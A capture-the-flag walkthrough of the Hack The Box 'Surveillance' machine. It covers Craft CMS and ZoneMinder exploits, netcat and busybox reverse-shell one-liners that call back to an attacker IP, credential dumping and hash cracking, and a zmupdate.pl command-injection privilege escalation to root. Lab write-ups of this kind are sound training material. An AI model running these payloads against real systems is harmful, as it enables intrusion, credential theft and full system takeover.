# Box: Surveillance
# Level: Medium
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:`sudo nmap -A -p- -v -T4 10.129.192.53`

![[Pasted image 20240220004724.png]]

From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80.


# Enumeration

Navigating to the webpage

![[Pasted image 20240219234741.png]]
Add `surveillance.htb` to your `/etc/hosts` file

Now lets navigate to the webpage again

![[Pasted image 20240219235223.png]]
Cool. Lets fuzz for directories using ffuf

command:`ffuf -u "http://surveillance.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup`

![[Pasted image 20240220002629.png]]
![[Pasted image 20240220002649.png]]

oops, that's a lot of directory. The juicy one here would be `admin`.

Lets navigate to the `/admin` directory

![[Pasted image 20240220002818.png]]

We have a login page, we can also see that the page is running on `craft cms`. Doing a quick research found a public exploit for this cms

![[Pasted image 20240220002942.png]]

Lets go ahead to exploit this


# Exploitation

You can download the exploit from [here](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py)

To run the exploit

command:`python exploit.py http://surveillance.htb/`

![[Pasted image 20240220003820.png]]

We spawned a shell hehe. Lets get a proper shell by using the payload below

payload:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.165 1234 >/tmp/f`

>Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine

![[Pasted image 20240220004054.png]]

To stabilize the shell you can use the commands  below

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z (To background)
stty raw -echo && fg
export TERM=xterm
```

![[Pasted image 20240220004311.png]]

Cool, now lets go ahead to escalate our privileges


# Privilege Escalation (To Matthew)

Running linpeas, found these interesting stuffs

![[Pasted image 20240220010617.png]]
![[Pasted image 20240220010743.png]]

These are database passwords

Lets try to connect to `craftdb`

command:`mysql -u craftuser -p`

password:`CraftCMSPassword2023!`

![[Pasted image 20240220020153.png]]

Nice Nice, we are connected hehe. Now lets try to dump the user table

```
show databases;
```

![[Pasted image 20240220020250.png]]

Now we can use the below commands to dump the user table

```
use craftdb;
show tables;
select id,username,fullname,email,password from users; 
```

![[Pasted image 20240220020606.png]]

cool, we found a hashed password. But trust me I couldn't crack this.

Moving on, I also found this interesting file from the output I got from linpeas

![[Pasted image 20240220014627.png]]

Lets download this to our machine

![[Pasted image 20240220015202.png]]

Now that we've downloaded it, lets unzip

![[Pasted image 20240220015512.png]]

Well we actually have `2293` lines in this file.

If you recall when we dumped the database earlier we had a fullname `Matthew B`, this makes our search easier, so what we'll do is search for that name. Hopefully we get something juicy


![[Pasted image 20240220021258.png]]

So we found that hash, lets identify it

![[Pasted image 20240220021418.png]]

it is a `sha-256` hash, we can decrypt this using `john the ripper`

command:`john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-sha256`

![[Pasted image 20240220021541.png]]

We got the password to be `starcraft122490`

We can use this password to switch user to `matthew`

`username: matthew`            `password: starcraft122490`

![[Pasted image 20240223065309.png]]

Lets further escalate our privileges

# Privilege Escalation (To Root)

Running the command `netstat -tulnp` you'll find out that there's a port `8080` running internally 

![[Pasted image 20240220022103.png]]

Lets portforward using ssh tunelling

command:`ssh -L 1234:127.0.0.1:8080 matthew@surveillance.htb -fN` 

>`-fN`: These options tell SSH to go into the background (`-f`) and not execute any remote commands (`-N`). This is useful when you only want to establish the SSH tunnel without opening a shell session on the remote server.

![[Pasted image 20240220192404.png]]

Now that we've done that lets navigate to the url `http://127.0.0.1:1234`

![[Pasted image 20240220192639.png]]

We get this `ZoneMinder` login page

What's ZoneMinder??

![[Pasted image 20240220192823.png]]

So it is a free open-source software used for monitoring

Default creds `admin/admin` didn't work hehe. Lets look for public exploits

![[Pasted image 20240220193401.png]]

You can download the exploit we'll be using from [here](https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py)

To run the exploit

command:`python bankai.py -t http://127.0.0.1:1234/ -ip 10.10.14.165 -p 1337`


![[Pasted image 20240220193308.png]]

Cool. we spawned a reverse shell hehe

To stabilize the shell, use the commands

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![[Pasted image 20240220193716.png]]

Now we can try to get root from here

Running  the command `sudo -l`

![[Pasted image 20240220193848.png]]

Now, all scripts related to application software can be run as sudo. So we need to find the particular script we can use

command:`find . -type f -name 'zm[a-zA-Z]*.pl'`

![[Pasted image 20240220195515.png]]

After a little research I found out that `zmupdate.pl` has a vulnerability

Lets use the help menu

![[Pasted image 20240220200057.png]]

So you'll need to specify a version. username and then a password. If you recall from our linpeas output we found the password of a `zm` database to be `ZoneMinderPassword2023`

The key aspect of this vulnerability is you can insert any command within the `$()` variable and the binary will execute it.

So we can execute a command like this

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
```

![[Pasted image 20240220200441.png]]

As you can see we got a root shell but it is not responsive hehe.

Well, lets create a reverse shell using a busybox payload and send it over to the target machine

```sh
#!/bin/bash
busybox nc 10.10.14.165 4444 -e /bin/sh
```

>Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine


![[Pasted image 20240220200810.png]]

Nice now lets run the `zmupdate.pl` script again

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)' --pass=ZoneMinderPassword2023
```

![[Pasted image 20240220201110.png]]

We spawned a root shell hehe

![[Pasted image 20240220201221.png]]

Box pwned successfully
